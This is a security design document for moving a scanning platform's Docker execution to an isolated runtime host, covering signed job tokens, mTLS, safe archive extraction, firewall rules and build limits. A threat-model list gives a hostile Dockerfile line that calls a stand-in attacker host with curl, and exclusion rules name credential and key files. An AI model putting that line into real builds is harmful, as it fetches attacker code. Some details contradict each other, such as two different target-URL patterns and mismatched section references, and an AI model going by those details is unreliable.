# SENTINEL-X — Phase 2: Runtime Execution Plane Migration Design (Revised)

**Branch:** `fix/security-hardening-audit` (HEAD `8a5430f`, not pushed)  
**Docker daemon:** Unavailable — live verification BLOCKED  
**Status:** DESIGN ONLY. No code changes. Awaiting approval before implementation.

---

## 0. Mandatory Constraints Honored

| Requirement | Status |
|-------------|--------|
| Asymmetric job-token signing; private key only in authorization component | §4, §8 |
| Runtime host receives only public verification key | §4.3, §8.3 |
| Separate one-time mutation auth from read-only status/log auth | §6.3, §9.3 |
| Idempotent submit/cancel; polling without replay errors | §6.4 |
| Exact origin allowlisting; no arbitrary URLs or redirects | §7.2, §7.3 |
| Compressed/decompressed size, file-count, extraction-timeout limits; safe tar extraction | §7.4 |
| Reject symlinks/hardlinks/absolute paths/traversal/device files/FIFOs; exclude .env/keys/credentials/.git | §7.5 |
| Never log pre-signed URLs or credentials | §7.6 |
| Build CPU/memory/PIDs/disk/time limits; no host mounts/secrets/build-time network | §9 |
| No gVisor claim unless separately implemented/tested | §13.2 |
| Corrected firewall for Docker-published ports; DOCKER-USER + host enforcement | §10 |
| Durable job state + orphan reconciliation after runtime-host restart | §11.2 |
| Runtime host generates resource names internally | §6.5 |
| Validate runtime responses as untrusted data | §12.3 |
| Fixed target URL format | §6.6 |
| Rollback never restores shared-host socket mount; fail closed; broker fallback dev/staging only | §14 |
| Reconcile RUNTIME_JOB_TOKEN_SECRET with asymmetric signing; evaluate RUNTIME_HOST_API_KEY need | §8.4, §8.5 |

---

## 1. Executive Summary

Phase 2 moves Docker execution from the co-located Runtime Broker (which holds the host Docker socket on the same host as the control plane) to a **separate Runtime Execution Plane** running on an independent VM/host with its own Docker daemon.

The control plane (FastAPI API + Celery worker) must **never** mount or directly access a Docker socket. It submits **jobs** to the Runtime Host over mTLS, presenting short-lived, asymmetric capability tokens issued by a separate **Authorization Component**. The Runtime Host receives only the **public verification key** — it never sees the private signing key.

This design removes the shared-host trust boundary (F-3/F-6): a compromised worker cannot reach the Docker socket, and a compromised runtime host cannot reach control-plane credentials.

---

## 2. Current State (HEAD `8a5430f`)

### 2.1 Components and Socket Access

| Component | Location | Docker Socket Access |
|-----------|----------|---------------------|
| Celery Worker | `docker-compose.yml` worker | No (removed in Phase A) |
| FastAPI API | `docker-compose.yml` api | No |
| Runtime Broker | `docker-compose.yml` broker | **Yes** — `/var/run/docker.sock:ro` |
| RuntimeOrchestrator | `backend/app/runtime/docker/orchestrator.py` | No (delegates via HTTP) |
| BrokerClient | `backend/app/runtime/broker/client.py` | No (HTTP to broker) |

### 2.2 Existing Pipeline Flow

1. `RepositoryService.fetch()` → workspace on control plane filesystem at `ASSESSMENT_WORKSPACE_BASE/<assessment_id>/`
2. `RuntimeOrchestrator.provision(assessment_id, workspace_path)` → build → run → health check → returns `target_url`
3. `assessment_pipeline.py:155` calls `self.runtime_orch.provision(...)`
4. DAST (ZAP) scans `target_url`
5. `assessment_pipeline.py:216` calls `self.runtime_orch.cleanup(assessment_id)` in `finally`
6. `assessments.py:211` calls `RuntimeOrchestrator().cleanup(...)` on assessment cancellation

All `RuntimeOrchestrator` method signatures must remain backward-compatible.

---

## 3. Threat Model & Trust Boundaries

### 3.1 Threats Addressed

| Threat | Phase 2 Mitigation |
|--------|-------------------|
| Compromised worker gains host Docker control | Worker has no socket mount; talks to runtime host over mTLS + capability tokens only |
| Compromised runtime host exposes control-plane secrets | Runtime host receives no DB/Redis/JWT/ENCRYPTION_KEY/OpenRouter credentials |
| Compromised worker submits jobs for other tenants | Job tokens bind `tenant_id` + `assessment_id`; runtime host enforces per-job isolation |
| Replay of job submissions | Mutation tokens are one-time-use with `jti` nonce cache |
| Duplicate resources after retries/restarts | Idempotency keys + runtime host generates resource names internally |
| Container escape reaches control plane | Target containers on separate VM; `--internal` networks; host firewall |
| Metadata access from targets | Host firewall blocks `169.254.169.254` from container namespace |
| Runtime host management access | Firewall blocks all inbound except mTLS from control plane IPs |

### 3.2 Trust Boundaries (Post-Phase 2)

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    CONTROL PLANE (existing host/VM)                         │
│  ┌──────────┐  ┌──────────┐  ┌──────────────────┐  ┌──────────┐  ┌──────┐  │
│  │   API    │  │  Worker  │  │ Authorization  │  │ Postgres │  │ Redis  │  │
│  │  (JWT,   │  │  (CELERY │  │ Component    │  │  (DB)    │  │(Queue) │  │
│  │   ENCR,  │  │  tasks)  │  │ (signing key)│  │          │  │        │  │
│  │   OAUTH) │  │          │  │              │  │          │  │        │  │
│  └────┬─────┘  └────┬─────┘  └──────────────┘  └────┬─────┘  └──────┘  │
│       │             │               │             │             │         │
│       │ mTLS + job   │ authz req    │             │             │         │
│       │ tokens       │ (HTTPS)      │             │             │         │
│       └──────────────┴──────────────┴─────────────┴─────────────┘         │
│                           │                                              │
│                           ▼                                              │
│  ┌────────────────────────────────────────────────────────────────────┐   │
│  │  RuntimeClient (RemoteRuntimeClient) — mTLS + capability tokens  │   │
│  └────────────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────────┘
                           │
                           ▼ (separate VM/host, isolated network)
┌─────────────────────────────────────────────────────────────────────────┐
│              RUNTIME EXECUTION PLANE (separate VM/host)                 │
│  ┌───────────────────────────────────────────────────────────────────┐  │
│  │  Runtime Host Service (FastAPI, mTLS server)                     │  │
│  │  - Holds ONLY public verification key                            │  │
│  │  - Verifies mTLS client cert + asymmetric job tokens             │  │
│  │  - Enforces fixed container security policy                      │  │
│  │  - NO access to control-plane DB/Redis/JWT/ENCRYPTION/OAUTH      │  │
│  └───────────────────────────────────────────────────────────────────┘  │
│                           │                                              │
│                           ▼                                              │
│  ┌───────────────────────────────────────────────────────────────────┐  │
│  │  Host Docker Daemon (rootless or rootful — evaluated, not claimed)│  │
│  │  - Target containers: cap_drop=ALL, no-new-privileges,           │  │
│  │    read-only rootfs, non-root user, --internal network           │  │
│  │  - Builds: --network=none, no host mounts, no build secrets      │  │
│  └───────────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 3.3 What the Runtime Host MUST NOT Have Access To

| Secret/Resource | Access | Reason |
|-----------------|--------|--------|
| PostgreSQL credentials | **No** | Not mounted or passed |
| Redis credentials | **No** | Not mounted or passed |
| JWT_SECRET / JWT_SECRET_KEY | **No** | Control plane only |
| ENCRYPTION_KEY (Fernet) | **No** | Control plane only |
| OpenRouter API key | **No** | Control plane only |
| GitHub OAuth tokens | **No** | Control plane only |
| Private job-signing key | **No** | Authorization component only |
| Control plane internal services | **No** | Host firewall blocks |

---

## 4. Key Ownership & Authorization Architecture (Asymmetric)

### 4.1 Three-Party Model

```
┌─────────────────┐      asymmetric JWT        ┌─────────────────────┐
│  Authorization  │ ─────────────────────────► │  Runtime Host       │
│  Component      │  (signs with PRIVATE key)  │  (verifies with     │
│                 │                            │  PUBLIC key only)     │
│  Holds:         │                            │  Holds:               │
│  - Private key  │                            │  - Public key         │
│  - Assessment   │                            │  - Nonce cache        │
│    ownership    │                            │  - Job state store    │
│    registry     │                            │  - Idempotency cache  │
└─────────────────┘                            └───────────────────────┘
        ▲                                               ▲
        │                                               │
        │ HTTPS (authz req)                             │ mTLS (job submission)
        │                                               │
        ▼                                               ▼
┌─────────────────┐                            ┌─────────────────────┐
│  Control Plane  │                            │  Docker Daemon      │
│  (Worker/API)   │                            │  (on runtime host)  │
│                 │                            │                     │
│  Requests       │                            │  Executes jobs      │
│  capabilities   │                            │  under fixed policy │
│  from authz     │                            │                     │
└─────────────────┘                            └───────────────────────┘
```

### 4.2 Key Ownership

| Key | Held By | Never Distributed To | Purpose |
|-----|---------|---------------------|---------|
| Job-signing private key | Authorization Component only | Runtime Host, Workers, API | Sign job capability tokens |
| Job-verification public key | Authorization Component, Runtime Host | Workers, API | Verify job token signatures |
| mTLS server cert/key | Runtime Host | Control plane | Authenticate runtime host to control plane |
| mTLS client cert/key | Control Plane (API + Worker) | Runtime Host | Authenticate control plane to runtime host |
| mTLS CA | Offline storage | Runtime (runtime) | Sign/verify mTLS certs |

### 4.3 How the Authorization Component Verifies Ownership Before Issuing Capabilities

When a Celery worker needs to provision a runtime for an assessment:

1. **Worker requests a capability token** from the Authorization Component via HTTPS, presenting:
   - Its own mTLS client certificate (proves it is a legitimate SENTINEL-X worker)
   - `assessment_id` and desired `operation` (build, run, or cleanup)

2. **Authorization Component checks:**
   - The worker's mTLS cert is valid and issued by the SENTINEL-X CA
   - The `assessment_id` exists in the database
   - The assessment's `tenant_id` matches the worker's tenant (workers are tenant-scoped)
   - The assessment is in a state that permits the requested operation (e.g., `BUILDING` for build, `RUNNING` for run, any non-terminal state for cleanup)
   - The requested `resources` (container_name, image_tag, network_name) are derived from the assessment_id, not client-supplied arbitrary names

3. **Authorization Component issues** a signed JWT capability token containing:
   - `jti` — unique job ID (replay prevention)
   - `tenant_id` — owning tenant
   - `assessment_id` — owning assessment
   - `job_id` — unique job identifier
   - `operation` — `build`, `run`, or `cleanup`
   - `resources` — list of exact resource names this job may touch (derived from assessment_id by authz, not client-supplied)
   - `resource_limits` — memory, CPU, PIDs, disk, time limits for this job
   - `exp` — short expiry (e.g., 5 minutes for mutations, 30 minutes for reads)
   - `nbf` — not-before
   - `iat` — issued-at
   - `iss` — `sentinelx-authorization`

4. **Worker receives** the signed token and presents it to the Runtime Host over mTLS.

5. **Runtime Host verifies:**
   - mTLS client cert is valid and signed by SENTINEL-X CA
   - JWT signature verifies with the **public verification key only** (private key never present on runtime host)
   - `exp` / `nbf` — not expired, not too early
   - `jti` not in short-term nonce cache (replay prevention)
   - `tenant_id` matches the resources being touched
   - `operation` matches the endpoint being called

### 4.4 Authorization Component Deployment & Signing-Key Custody

#### 4.4.1 Deployment Location

The Authorization Component is a **dedicated, isolated service** running on the **control plane host** (or a dedicated auth VM), **not** on the runtime host. It is **never** co-located with the Runtime Host or the Docker daemon.

Network placement:
- The Authorization Component listens on the control plane's internal network only (not exposed to the public internet).
- The Runtime Host does **not** have direct network access to the Authorization Component's private signing key or internal database.
- Workers/API call the Authorization Component over HTTPS (mTLS client cert + bearer token) to obtain job capability tokens.

#### 4.4.2 Signing-Key Custody

| Key | Stored On | Used By | Never Distributed To |
|-----|-----------|---------|---------------------|
| Job-signing **private** key | Authorization Component's HSM or encrypted filesystem (at-rest encryption) | Authorization Component only | Runtime Host, Workers, API, Control Plane |
| Job-verification **public** key | Authorization Component + Runtime Host | Runtime Host (verifies tokens) | None — public by design |
| mTLS CA private key | Offline storage (air-gapped or HSM) | Certificate issuance only | Runtime hosts, workers |

Key rotation procedure:
1. Generate a new RSA-2048 or Ed25519 key pair on the Authorization Component.
2. Distribute the new public key to all Runtime Hosts via secure configuration management.
3. Runtime Hosts accept tokens signed by either the old or new public key during a 24-hour overlap window.
4. Revoke the old private key after the overlap window expires.

#### 4.4.3 Identity Verification

The Authorization Component verifies the identity of any entity requesting a capability token:

| Caller | Identity Mechanism | Verified By Authorization Component |
|--------|-------------------|-------------------------------------|
| Celery Worker | mTLS client certificate + service account | Cert chain validates to SENTINEL-X CA; cert subject matches registered worker identity |
| FastAPI API | mTLS client certificate + service account | Cert chain validates to SENTINEL-X CA; cert subject matches registered API identity |
| Runtime Host | mTLS server certificate | Control plane validates server cert against `runtime-ca.crt` |

The Authorization Component rejects any token request from an unrecognized or revoked certificate.

#### 4.4.4 DB-Backed Authorization Checks

Before issuing any capability token, the Authorization Component queries its **own PostgreSQL database** (separate from the control-plane PostgreSQL) to verify:

| Check | Query | Reject If |
|-------|-------|-----------|
| Assessment exists | `SELECT id, tenant_id, status FROM assessments WHERE id = $1` | No row found |
| Tenant ownership | `SELECT tenant_id FROM assessments WHERE id = $1` | `tenant_id` does not match the worker's tenant |
| Operation permitted | `SELECT status FROM assessments WHERE id = $1` | Status is `COMPLETED`, `FAILED`, or `CANCELLED` (terminal states) |
| Worker authorized | `SELECT tenant_id FROM workers WHERE cert_subject = $1` | Worker cert subject not registered or tenant mismatch |

The Authorization Component logs every token issuance with `job_id`, `assessment_id`, `tenant_id`, `operation`, `worker_cert_subject`, and `timestamp` for audit purposes.

---

## 5. Job Lifecycle & State Machine

### 5.1 States

```
PENDING → BUILDING → RUNNING → COMPLETED
   ↓         ↓         ↓         ↓
 FAILED   FAILED   FAILED   CANCELLED
   ↓         ↓         ↓         ↓
 CLEANED_UP (terminal for all paths)
```

### 5.2 Terminal States

- `COMPLETED`: Job finished successfully. Container/image/network may still exist until cleanup job runs.
- `FAILED`: Job failed at any stage. Original error preserved (not masked by cleanup).
- `CANCELLED`: Job cancelled by control plane (assessment cancellation).
- `CLEANED_UP`: All resources removed; no further transitions.

### 5.3 Durable Job State

The Runtime Host persists job state durably (SQLite or PostgreSQL on the runtime host VM, separate from control-plane databases):

| Field | Description |
|-------|-------------|
| `job_id` | Unique job identifier (matches `jti`) |
| `tenant_id` | Owning tenant |
| `assessment_id` | Owning assessment |
| `operation` | `build` / `run` / `cleanup` |
| `status` | Current lifecycle state |
| `resources` | Container name, image tag, network name |
| `target_url` | For `run` jobs: `http://<runtime-host-internal-ip>:<host-port>` |
| `error` | Failure reason (original error, not cleanup error) |
| `created_at`, `updated_at`, `completed_at` | Timestamps |
| `idempotency_key` | Client-provided idempotency key for submit |
| `result` | Job result (for completed jobs) |

### 5.4 Orphan Resource Reconciliation

On runtime host startup:
1. Scan Docker for containers/networks/images matching `sentinelx-*-<assessment_id>` pattern
2. Cross-reference with durable job state
3. Any resource with no corresponding active job → mark as orphan
4. Orphan cleanup worker runs every 30 minutes, removing orphaned resources older than 1 hour
5. Control plane can trigger reconciliation via `POST /v1/runtime/admin/reconcile` (admin-only, mTLS)

---

## 6. API Design (Job-Oriented)

### 6.1 Endpoints

All endpoints require **mTLS client certificate** + **job capability token** in `X-Runtime-Job-Token` header.

| Method | Path | Token Type | Purpose |
|--------|------|-----------|---------|
| `GET` | `/v1/runtime/health` | mTLS only | Liveness + Docker availability |
| `POST` | `/v1/runtime/jobs/submit` | mTLS + **mutation** token | Submit a job (build/run/cleanup) |
| `GET` | `/v1/runtime/jobs/{job_id}/status` | mTLS + **read** token | Get job status |
| `GET` | `/v1/runtime/jobs/{job_id}/logs` | mTLS + **read** token | Get redacted container logs |
| `POST` | `/v1/runtime/jobs/{job_id}/cancel` | mTLS + **mutation** token | Cancel/cleanup a job |

**No per-Docker-operation endpoints.** Everything goes through `submit` with an `operation` field.

### 6.2 Token Types

| Token Type | Operations Allowed | One-Time? | Replay Cache? |
|------------|-------------------|-----------|---------------|
| Mutation | `build`, `run`, `cleanup`, `cancel` | Yes (jti consumed once) | Yes |
| Read | `status`, `logs` | No (re-usable within TTL) | No (but jti still validated for freshness) |

Read tokens have a separate, shorter namespace and cannot be used for mutations. Mutation tokens are consumed once and cannot be replayed.

### 6.3 Job Submission Request

```json
POST /v1/runtime/jobs/submit
{
  "idempotency_key": "ik-<uuid>",
  "job_id": "j-<uuid>",
  "tenant_id": "t-<uuid>",
  "assessment_id": "a-<uuid>",
  "operation": "build",
  
  // For build:
  "artifact_url": "https://<control-plane-internal-ip>:8444/artifacts/<assessment_id>.tar.gz",
  "artifact_sha256": "sha256:abc123...",
  "image_tag": "sentinelx-app-<assessment>",
  "network_mode": "none",
  
  // For run:
  "container_name": "sentinelx-cont-<assessment>",
  "image_tag": "sentinelx-app-<assessment>",
  "network_name": "sentinelx-net-<assessment>",
  "app_port": 8000,
  
  // For cleanup:
  "container_name": "sentinelx-cont-<assessment>",
  "network_name": "sentinelx-net-<assessment>",
  "image_tag": "sentinelx-app-<assessment>"
}
```

### 6.4 Job Submission Response

```json
{
  "job_id": "j-<uuid>",
  "status": "accepted",
  "message": "Job accepted for processing",
  "target_url": "http://10.x.y.w:32768",
  "expires_at": "2026-11-10T13:10:00Z"
}
```

**Target URL format:** `http://<runtime-host-internal-ip>:<host-port>` — never `0.0.0.0`, never `:<app-port>`, never a hostname that could resolve differently. The host-port is allocated by the runtime host. The `app_port` is internal to the container and is never exposed outside it.

### 6.5 Resource Names Are Internally Generated

The Runtime Host **generates** all resource names internally from `assessment_id`:
- Container: `sentinelx-cont-<assessment_id[:12]>`
- Network: `sentinelx-net-<assessment_id[:12]>`
- Image: `sentinelx-app-<assessment_id[:12]>`

The control plane **never** supplies arbitrary resource names. The job token's `resources` field lists the exact names the runtime host generated, and the runtime host verifies the request matches.

---

## 6.6 (continued) — Control Plane Validates Runtime Responses as Untrusted

All responses from the Runtime Host are treated as untrusted data:

- `target_url` is validated against an allowlist pattern `^http://<runtime-host-ip>:\d+$` before being stored or used
- `job_id` is verified against the submitted job ID
- `status` values are validated against the known state machine
- Log content is passed through the secret redactor before storage or display

---

## 7. Artifact Transfer Security

### 7.1 Design: Control-Plane-Mediated Pre-signed URL

The control plane fetches the repository to its workspace (`ASSESSMENT_WORKSPACE_BASE/<assessment_id>/`). The runtime host needs this workspace to build the image.

**Flow:**

1. Control plane tars the workspace directory: `workspace.tar.gz` from `ASSESSMENT_WORKSPACE_BASE/<assessment_id>/`
2. Control plane computes SHA-256 of the tarball
3. Control plane generates a **time-limited pre-signed URL** pointing to itself (the control plane runs a temporary internal file server on a loopback-only port, accessible only from the runtime host via the mTLS network)
   - OR: Control plane POSTs the tarball directly as `multipart/form-data` to `/v1/runtime/jobs/submit` over the mTLS connection (for workspaces < 50 MB)
4. Control plane submits job with `artifact_url` + `artifact_sha256`
5. Runtime host downloads tarball from `artifact_url`
6. Runtime host verifies SHA-256 matches; rejects if mismatch
7. Runtime host extracts to isolated temp dir (`/tmp/runtime-<job_id>/`)
8. Runtime host builds image from extracted dir
9. Runtime host cleans up extracted dir after build (success or failure)

### 7.2 Origin Allowlisting (Resolving RFC1918 Conflict)

The original design rejected RFC1918 addresses, but the control plane and runtime host may communicate over RFC1918 IPs in a private VPC. **This is acceptable and expected.**

**Resolution:** Origin allowlisting is based on **explicitly configured, known control-plane IPs**, not on public/private classification.

| Control | Implementation |
|---------|---------------|
| Origin allowlisting | `artifact_url` must match `https://<allowed-control-plane-ip>:<port>/artifacts/<assessment_id>.tar.gz` exactly. The allowed IPs are configured in `RUNTIME_ARTIFACT_ORIGINS` (comma-separated CIDR or IP list). |
| Destination validation | Resolved IP must be in the allowed origin set. Loopback, metadata (169.254.169.254), and RFC1918 addresses **not in the allowlist** are rejected. |
| No arbitrary redirects | HTTP redirects are not followed. If the origin returns a redirect, the request fails. |
| No arbitrary URLs | Only HTTPS URLs matching the allowlist pattern are accepted. File://, ftp://, etc. are rejected. |

### 7.3 Archive Safety

| Control | Implementation |
|---------|---------------|
| Compressed size limit | Reject tarballs > 500 MB (compressed) |
| Decompressed size limit | Reject if extracted content > 2 GB |
| File-count limit | Reject archives with > 50,000 files |
| Extraction timeout | Reject if extraction takes > 120 seconds |
| Path traversal rejection | Reject any member whose resolved path escapes the extraction directory |
| Symlink rejection | Reject any symlink member |
| Hardlink rejection | Reject any hardlink member |
| Absolute path rejection | Reject any member with an absolute path |
| Device file rejection | Reject any block/char device, FIFO, or socket member |
| .env exclusion | Reject or strip any member named `.env` or `*.env` |
| Private key exclusion | Reject any member matching `*.key`, `*.pem`, `*.p12`, `*.pfx`, `id_rsa`, `id_ed25519` |
| Credential exclusion | Reject any member matching `*secret*`, `*credential*`, `*password*` |
| .git exclusion | Exclude `.git/` directory members entirely |

### 7.4 Logging Rules

| Item | Rule |
|------|------|
| Pre-signed URLs | Never logged in full. Log only the job ID and a hash of the URL. |
| Credentials | Never logged. |
| Artifact URLs in error messages | Sanitized before inclusion. |
| Runtime host logs | Written to runtime host local syslog; never forwarded to control plane with secrets. |

---

## 8. Job Token Specification (Asymmetric)

### 8.1 Token Format (JWT, RS256/Ed25519)

```json
{
  "jti": "job-<uuid>",
  "tenant_id": "t-<uuid>",
  "assessment_id": "a-<uuid>",
  "job_id": "j-<uuid>",
  "operation": "build",
  "resources": [
    "sentinelx-cont-<assessment>",
    "sentinelx-app-<assessment>",
    "sentinelx-net-<assessment>"
  ],
  "resource_limits": {
    "memory": "512m",
    "cpus": "1.0",
    "pids": 100,
    "disk": "2g",
    "timeout_seconds": 180
  },
  "exp": 1731234567,
  "nbf": 1731234500,
  "iat": 1731234500,
  "iss": "sentinelx-authorization",
  "token_type": "mutation"
}
```

### 8.2 Key Ownership (Reconciled)

| Key | Held By | Purpose |
|-----|---------|---------|
| Job-signing **private** key | Authorization Component only | Signs job capability tokens |
| Job-verification **public** key | Authorization Component + Runtime Host | Verifies job token signatures |
| `RUNTIME_JOB_TOKEN_SECRET` | **Removed** | Replaced by asymmetric key pair; no shared secret needed |
| `RUNTIME_HOST_API_KEY` | **Removed** | Not needed — mTLS client cert + signed JWT token provide authentication and authorization |

**Rationale:** With asymmetric signing + mTLS, there is no need for a shared `RUNTIME_JOB_TOKEN_SECRET` or `RUNTIME_HOST_API_KEY`. The control plane proves its identity via mTLS client cert, and proves job authorization via the signed JWT. The runtime host verifies both using only public information (CA cert + public verification key).

---

## 8.3 Token Validation (Runtime Host)

1. Verify mTLS client certificate against `runtime-ca.crt`
2. Extract JWT from `X-Runtime-Job-Token` header
3. Verify JWT signature with public verification key (RS256/Ed25519)
4. Check `exp` / `nbf` — not expired, not too early
5. Check `jti` against nonce cache — reject if already used (mutation tokens only)
6. Check `tenant_id` matches resources in request
7. Check `operation` matches the endpoint/method being called
8. Check `iss` == `sentinelx-authorization`

---

## 9. Network Security

### 9.1 Network Topology

```
┌─────────────────┐      mTLS (8443) + Job Tokens      ┌──────────────────┐
│  Control Plane  │ ─────────────────────────────────► │  Runtime Host    │
│  (API + Worker) │  (tenant-scoped job tokens)        │  (Docker socket) │
│  10.x.y.z/24    │                                   │  10.x.y.w/24       │
└─────────────────┘                                   └──────────────────┘
                                                            │
                              Docker --internal networks   │
                                                            │
                                    ┌──────────────────────┴──────────────────────┐
                                    │  Target Containers (ephemeral)              │
                                    │  - cap_drop=ALL, no-new-privileges          │
                                    │  - read-only rootfs, non-root user          │
                                    │  - --internal network (no egress)           │
                                    │  - Port bound to runtime-host-internal-IP   │
                                    └───────────────────────────────────────────────┘
```

### 9.2 Host Firewall Rules (Runtime Host)

| Chain | Direction | Rule | Purpose |
|-------|-----------|------|---------|
| INPUT | Ingress | `-i <control-plane-iface> -s <control-plane-ip> -p tcp --dport 8443 -j ACCEPT` | Control plane reaches mTLS endpoint |
| INPUT | Ingress | `-i <external-iface> -p tcp --dport 8443 -j DROP` | Block public mTLS access |
| INPUT | Ingress | `-i <control-plane-iface> -s <control-plane-ip> -p tcp --dport <published-container-port> -j ACCEPT` | Control plane reaches container for DAST |
| INPUT | Ingress | `-p tcp --dport <published-container-port> -j DROP` | Block all other container port access |
| INPUT | Ingress | `-j DROP` | Default deny all other inbound |
| FORWARD | Forward | Docker `--internal` chains | Container cannot reach WAN/LAN |
| OUTPUT | Egress | `-o docker0 -d 169.254.169.254 -j DROP` | Container cannot reach cloud metadata |
| OUTPUT | Egress | `-o <host-mgmt-iface> -j DROP` (from container namespace) | Container cannot reach host management interfaces |

### 9.3 Docker-Published Port Security

**Critical correction:** Docker's `--internal` flag blocks egress (FORWARD chain) but does **not** restrict ingress to published ports. A container publishing `-p=0.0.0.0:32768:8000` would be reachable from any host that can reach the runtime host.

**Correction:**
- All container ports are published bound to the runtime host's **internal interface IP only**: `-p=<runtime-host-internal-ip>:<host-port>:<app-port>`
- Never `0.0.0.0`
- Host firewall (`INPUT` chain) restricts access to published ports to control-plane IPs only
- `DOCKER-USER` chain is used as an additional layer: `-I DOCKER-USER -i <external-iface> -p tcp --dport <published-port> -j DROP`

### 9.4 DAST Reachability

The control plane's DAST scanner (ZAP) needs to reach the running container for dynamic testing.

| Path | Allowed? | Mechanism |
|------|----------|-----------|
| Control plane → container port | Yes | Published to runtime-host-internal-IP; host firewall allows control-plane IP |
| Unrelated host → container port | No | Host firewall drops |
| Container → control plane | No | Container has no inbound from control plane except via published port; container's outbound is blocked by `--internal` |
| Container → cloud metadata | No | Host firewall + `--internal` |

---

## 10. Build Isolation

### 10.1 Hostile Build Context Assumption

Dockerfiles and build contexts are treated as **hostile input**. A malicious repository may contain:
- `Dockerfile` with `RUN curl http://attacker.com/...`
- `Dockerfile` with `COPY . /` including host-sensitive files
- `Dockerfile` with `USER root`
- Symlinks in the build context pointing outside the context

### 10.2 Build Limits

| Limit | Value | Enforcement |
|-------|-------|-------------|
| Memory | 512 MB | `--memory=512m` |
| CPU | 1.0 core | `--cpus=1.0` |
| PIDs | 100 | `--pids-limit=100` |
| Disk | 2 GB | Runtime host monitors build container disk usage |
| Time | 180 seconds | Runtime host kills build after timeout |
| Network | `--network=none` | No outbound during build `RUN` steps |

### 10.3 Build Restrictions

| Control | Implementation |
|---------|---------------|
| No host mounts | Runtime host never passes `-v` host paths to `docker build` |
| No build secrets | Runtime host never passes `--build-arg` with secrets |
| No build-time network | `--network=none` for all builds |
| Base image pinning | Only `python:`, `node:`, `alpine:`, `sentinelx-app-` prefixes allowed |
| Dockerfile validation | Runtime host generates Dockerfile internally (not client-supplied) |
| Build context | Restricted to extracted tarball from verified artifact transfer |

### 10.4 Remaining Docker/BuildKit Attack Surface

| Risk | Description | Mitigation Status |
|------|-------------|-------------------|
| Docker daemon escape | Container escape via kernel vulnerability reaches runtime host kernel | Accepted (separate VM); evaluate rootless Docker/gVisor |
| BuildKit sandbox escape | Vulnerability in BuildKit allows escape | BuildKit not used; classic `docker build` only |
| Base image compromise | Malicious base image | Base images pinned; scanned on runtime host |
| Docker API exposure | Runtime host socket accessible | Socket not exposed over TCP; only local UNIX socket |

**gVisor is NOT claimed to protect the build process.** gVisor is not implemented or tested. It is listed as a future evaluation option only.

---

## 11. Job Lifecycle

### 11.1 State Machine (Durable)

```
PENDING → BUILDING → RUNNING → COMPLETED
   ↓         ↓         ↓         ↓
 FAILED   FAILED   FAILED   CANCELLED
   ↓         ↓         ↓         ↓
 CLEANED_UP (terminal)
```

All transitions are persisted durably on the runtime host before the corresponding action is taken.

### 11.2 Recovery After Runtime Host Restart

1. Runtime host restarts and loads durable job state
2. For jobs in `BUILDING`, `RUNNING`, or `CLEANING_UP`:
   - Query Docker for existing containers/networks/images matching `sentinelx-*-<assessment_id>`
   - If resources exist: mark job as `FAILED` (control plane will retry with new job)
   - If resources don't exist: mark job as `FAILED` (orphaned, no resources to recover)
3. Control plane, on next assessment retry, submits new jobs with new `idempotency_key`
4. Orphan resource reconciliation runs every 30 minutes

### 11.3 Resource Name Generation

| Resource | Name Format | Generated By |
|----------|-------------|--------------|
| Container | `sentinelx-cont-<assessment_id[:12]>` | Runtime Host |
| Network | `sentinelx-net-<assessment_id[:12]>` | Runtime Host |
| Image | `sentinelx-app-<assessment_id[:12]>` | Runtime Host |

The control plane **never** supplies resource names. The job token contains the exact names the runtime host will use, and the runtime host verifies the request matches.

### 11.4 Control Plane Validates Runtime Responses as Untrusted

| Response Field | Validation |
|----------------|------------|
| `job_id` | Must match submitted job ID |
| `status` | Must be one of known state machine values |
| `target_url` | Must match `^http://<runtime-host-internal-ip>:\d+:\d+$` |
| `error` | Passed through to control plane logs (redacted) |
| Container names | Must match `sentinelx-*-<assessment_id>` pattern |

---

## 12. Control Plane Integration

### 12.1 RuntimeClient Extension

The `RuntimeClient` ABC (from Phase 1) is extended with job-oriented methods:

```python
class RuntimeClient(abc.ABC):
    @abc.abstractmethod
    def submit_job(self, assessment_id, operation, artifact_url, artifact_sha256) -> Tuple[bool, str, Optional[str]]
    # Returns (ok, job_id_or_error, target_url_or_none)
    
    @abc.abstractmethod
    def get_job_status(self, job_id) -> Tuple[bool, str, Optional[str]]
    # Returns (ok, status, target_url_or_error)
    
    @abc.abstractmethod
    def get_job_logs(self, job_id) -> Tuple[bool, str]
    
    @abc.abstractmethod
    def cancel_job(self, job_id) -> Tuple[bool, str]
    
    @abc.abstractmethod
    def is_available(self) -> bool
```

### 12.2 RemoteRuntimeClient

- Uses mTLS (`RUNTIME_CLIENT_CERT`, `RUNTIME_CLIENT_KEY`, `RUNTIME_CA_CERT`)
- Signs requests with job tokens obtained from Authorization Component
- Validates runtime responses as untrusted (target_url pattern, status values)
- Fail-closed: if runtime host unavailable, returns failure; no direct-docker fallback

### 12.3 Orchestrator Adaptation

`RuntimeOrchestrator.provision()` calls `runtime_client.submit_job()` with `operation="build"` then `operation="run"`, then polls `get_job_status()` until `COMPLETED` or `FAILED`. `cleanup()` calls `submit_job()` with `operation="cleanup"`.

All existing callers (`assessment_pipeline.py`, `assessment_tasks.py`, `assessments.py`) continue to work without signature changes.

---

## 13. Rootless Docker & gVisor Evaluation

| Option | Description | Pros | Cons | Status |
|--------|-------------|------|------|--------|
| Rootless Docker | `dockerd` runs as non-root user | Reduced blast radius; no setuid | Some build features limited; Docker-in-Docker complexity | **Evaluate** on runtime host VM (not claimed) |
| gVisor (`runsc`) | User-space kernel intercepts syscalls | Strong syscall isolation | ~100-200 MB RAM per container; slower startup | **Evaluate** (not claimed) |
| Kata/Firecracker | Hardware VM per container | Strongest isolation | High RAM overhead; not for 8GB laptop | **Not recommended** for Phase 2 |

**Position:** Neither rootless Docker nor gVisor is implemented or claimed as sufficient. Both require live testing on the runtime host VM (blocked in this environment without Docker access).

---

## 14. Migration Stages & Rollback

### 14.1 Stages

| Stage | Work | Docker Needed? |
|-------|------|----------------|
| 2.1 | `RuntimeClient` ABC job-oriented methods + `RemoteRuntimeClient` | No |
| 2.2 | `artifact_transfer.py` + `job_token.py` | No |
| 2.3 | Authorization Component (signing key, token issuance, ownership verification) | No |
| 2.4 | Config: `RUNTIME_MODE=remote`, mTLS settings, artifact settings | No |
| 2.5 | Orchestrator adaptation (submit/poll instead of direct build/run) | No |
